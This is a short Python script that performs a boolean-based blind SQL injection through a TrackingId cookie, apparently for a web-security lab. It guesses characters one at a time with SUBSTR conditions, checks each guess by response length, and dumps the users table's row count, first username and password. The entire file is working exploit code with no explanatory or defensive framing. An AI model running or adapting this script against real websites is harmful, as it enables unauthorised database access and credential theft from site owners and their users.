import urllib.request, string

url = "http://your-site/"
chars = string.ascii_letters + string.digits + "{}_-@./:=,()'\" *_"

def check(sql_cond):
    payload = f"base-tracking-id-123' AND ({sql_cond})--"
    req = urllib.request.Request(url)
    req.add_header("Cookie", f"TrackingId={payload}")
    try:
        with urllib.request.urlopen(req) as resp:
            return len(resp.read()) == 5652
    except Exception:
        return False

def dump_query(query_expr):
    res = ""
    while True:
        found = False
        for c in chars:
            pos = len(res) + 1
            cond = f"SUBSTR(({query_expr}), {pos}, 1) = '{c}'"
            if check(cond):
                res += c
                found = True
                print(res, flush=True)
                break
        if not found:
            break
    return res

print("Row count users:", dump_query("SELECT count(*) FROM users"))
print("First user username:", dump_query("SELECT username FROM users LIMIT 1"))
print("First user password:", dump_query("SELECT password FROM users LIMIT 1"))
